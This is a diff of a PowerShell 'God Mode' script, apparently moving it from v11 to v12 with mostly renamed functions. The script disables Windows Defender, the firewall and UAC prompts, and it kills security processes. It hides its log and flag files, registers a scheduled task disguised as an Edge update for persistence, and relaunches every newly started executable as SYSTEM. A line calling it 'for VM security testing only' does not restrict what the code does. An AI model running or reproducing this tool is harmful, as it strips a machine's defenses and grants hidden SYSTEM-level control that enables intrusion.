@@ -2,10 +2,11 @@
 
 <#
 .SYNOPSIS
-    God Mode v11 - Overhauled (Dangerous + Stealth Combined)
+    God Mode v12 - Overhauled Edition
 .DESCRIPTION
-    Advanced privilege escalation tool with stealth capabilities.
-    For VM security testing only. Restricted to Built-in Administrator.
+    Advanced stealth + dangerous privilege tool.
+    For VM security testing only.
+    Restricted to Built-in Administrator account.
 #>
 
 param(
@@ -16,35 +17,40 @@ param(
     [switch]$Help
 )
 
+# ============================================================
+#  CONFIGURATION
+# ============================================================
 $FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
 $LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
 $TaskPrefix = "MicrosoftEdgeUpdateTask_"
 
 # ============================================================
-#  SECURITY: Only allow Built-in Administrator
+#  SECURITY CHECK
 # ============================================================
-function Test-IsBuiltInAdmin {
+function Test-BuiltInAdmin {
     $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
-    return $sid -like "*-500"
+    return ($sid -like "*-500")
 }
 
-if (-not (Test-IsBuiltInAdmin) -and -not $Status -and -not $Help) {
-    Write-Host "`n[ACCESS DENIED] This tool can only be used by the Built-in Administrator." -ForegroundColor Red
+if (-not (Test-BuiltInAdmin) -and -not $Status -and -not $Help) {
+    Write-Host "`n[ACCESS DENIED] This tool is restricted to the Built-in Administrator only.`n" -ForegroundColor Red
     exit 1
 }
 
 # ============================================================
-#  CORE FUNCTIONS
+#  LOGGING
 # ============================================================
-
 function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "[$timestamp] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
 }
 
-function Apply-DangerousConfiguration {
-    Write-Log "Applying dangerous configuration..." "WARN"
+# ============================================================
+#  DANGEROUS CONFIGURATION
+# ============================================================
+function Enable-DangerousMode {
+    Write-Log "Enabling dangerous mode..." "WARN"
 
     try {
         # Disable Windows Defender
@@ -63,19 +69,19 @@ function Apply-DangerousConfiguration {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
             -Name ConsentPromptBehaviorAdmin -Value 0 -Force
 
-        # Attempt to stop Defender processes
+        # Kill security processes
         Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
             Stop-Process -Force -ErrorAction SilentlyContinue
 
-        Write-Log "Dangerous configuration applied successfully." "WARN"
+        Write-Log "Dangerous mode enabled successfully." "WARN"
     }
     catch {
-        Write-Log "Error applying dangerous settings: $_" "ERROR"
+        Write-Log "Error enabling dangerous mode: $_" "ERROR"
     }
 }
 
-function Revert-DangerousConfiguration {
-    Write-Log "Reverting dangerous configuration..." "WARN"
+function Disable-DangerousMode {
+    Write-Log "Disabling dangerous mode..." "WARN"
     try {
         Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
@@ -84,28 +90,16 @@ function Revert-DangerousConfiguration {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
             -Name EnableLUA -Value 1 -Force
         Start-Service -Name WinDefend -ErrorAction SilentlyContinue
-        Write-Log "Configuration reverted." "OK"
+        Write-Log "Dangerous mode disabled." "OK"
     }
     catch {
-        Write-Log "Failed to fully revert settings: $_" "ERROR"
+        Write-Log "Failed to fully disable dangerous mode: $_" "ERROR"
     }
 }
 
-function Set-GodMode {
-    param([bool]$Enable)
-    if ($Enable) {
-        "1" | Out-File $FlagFile -Force
-        Apply-DangerousConfiguration
-        Register-StealthTask
-        Write-Log "God Mode ENABLED (Dangerous + Stealth)" "WARN"
-    } else {
-        Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
-        Revert-DangerousConfiguration
-        Unregister-StealthTask
-        Write-Log "God Mode DISABLED" "WARN"
-    }
-}
-
+# ============================================================
+#  STEALTH TASK MANAGEMENT
+# ============================================================
 function Register-StealthTask {
     $taskName = $TaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
     Unregister-StealthTask
@@ -126,45 +120,43 @@ function Unregister-StealthTask {
         Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
 }
 
-function Get-GodModeStatus {
-    if (Test-Path $FlagFile) {
-        Write-Host "God Mode Status: ACTIVE (Dangerous + Stealth Mode)" -ForegroundColor Red
-    } else {
-        Write-Host "God Mode Status: INACTIVE" -ForegroundColor Green
-    }
-}
-
+# ============================================================
+#  PROCESS ELEVATION
+# ============================================================
 function Elevate-Process {
-    param([string]$ExecutablePath)
-    if (-not (Test-Path $ExecutablePath)) { return }
+    param([string]$Path)
+    if (-not (Test-Path $Path)) { return }
 
-    Write-Log "Elevating process: $ExecutablePath" "STEALTH"
+    Write-Log "Elevating: $Path" "STEALTH"
 
     try {
-        $action = New-ScheduledTaskAction -Execute $ExecutablePath
+        $action = New-ScheduledTaskAction -Execute $Path
         $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
             -LogonType ServiceAccount -RunLevel Highest
-        $tempTask = "TempElevate_" + (Get-Random -Minimum 1000 -Maximum 99999)
+        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)
 
         Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
         Start-ScheduledTask -TaskName $tempTask
-        Start-Sleep -Milliseconds 400
+        Start-Sleep -Milliseconds 350
         Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
     }
     catch {
-        Write-Log "Failed to elevate process: $ExecutablePath" "ERROR"
+        Write-Log "Failed to elevate process: $Path" "ERROR"
     }
 }
 
-function Start-Monitoring {
+# ============================================================
+#  MAIN MONITORING LOOP
+# ============================================================
+function Start-MonitorLoop {
     if (-not (Test-Path $FlagFile)) {
-        Write-Log "God Mode is not enabled." "ERROR"
+        Write-Log "God Mode is not active." "ERROR"
         return
     }
 
-    Write-Log "God Mode monitoring started..." "INFO"
+    Write-Log "God Mode monitoring started." "INFO"
 
-    $processed = @{}
+    $seenProcesses = @{}
 
     while ($true) {
         Start-Sleep -Seconds 2
@@ -174,14 +166,39 @@ function Start-Monitoring {
             ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-10)
         }
 
-        foreach ($proc in $newProcesses) {
-            if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
-                if (-not $processed.ContainsKey($proc.ExecutablePath)) {
-                    $processed[$proc.ExecutablePath] = $true
-                    Elevate-Process $proc.ExecutablePath
+        foreach ($process in $newProcesses) {
+            if ($process.ExecutablePath -and $process.ExecutablePath -like "*.exe") {
+                if (-not $seenProcesses.ContainsKey($process.ExecutablePath)) {
+                    $seenProcesses[$process.ExecutablePath] = $true
+                    Elevate-Process $process.ExecutablePath
                 }
             }
         }
+    }
+}
+
+# ============================================================
+#  TOGGLE & STATUS
+# ============================================================
+function Enable-GodMode {
+    "1" | Out-File $FlagFile -Force
+    Register-StealthTask
+    Enable-DangerousMode
+    Write-Log "God Mode ENABLED" "WARN"
+}
+
+function Disable-GodMode {
+    Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
+    Unregister-StealthTask
+    Disable-DangerousMode
+    Write-Log "God Mode DISABLED" "WARN"
+}
+
+function Show-Status {
+    if (Test-Path $FlagFile) {
+        Write-Host "God Mode Status: ACTIVE (Dangerous + Stealth)" -ForegroundColor Red
+    } else {
+        Write-Host "God Mode Status: INACTIVE" -ForegroundColor Green
     }
 }
 
@@ -191,8 +208,8 @@ function Start-Monitoring {
 
 if ($Help) {
     Write-Host @"
-God Mode v11 - Commands:
-  -ToggleOn     Enable God Mode (Dangerous + Stealth)
+God Mode v12 - Commands:
+  -ToggleOn     Enable God Mode
   -ToggleOff    Disable God Mode
   -Status       Show current status
   -Launch       Start monitoring manually
@@ -200,10 +217,10 @@ God Mode v11 - Commands:
     exit
 }
 
-if ($ToggleOn)  { Set-GodMode $true; exit }
-if ($ToggleOff) { Set-GodMode $false; exit }
-if ($Status)    { Get-GodModeStatus; exit }
+if ($ToggleOn)  { Enable-GodMode; exit }
+if ($ToggleOff) { Disable-GodMode; exit }
+if ($Status)    { Show-Status; exit }
 
 if ($Launch) {
-    Start-Monitoring
+    Start-MonitorLoop
 }
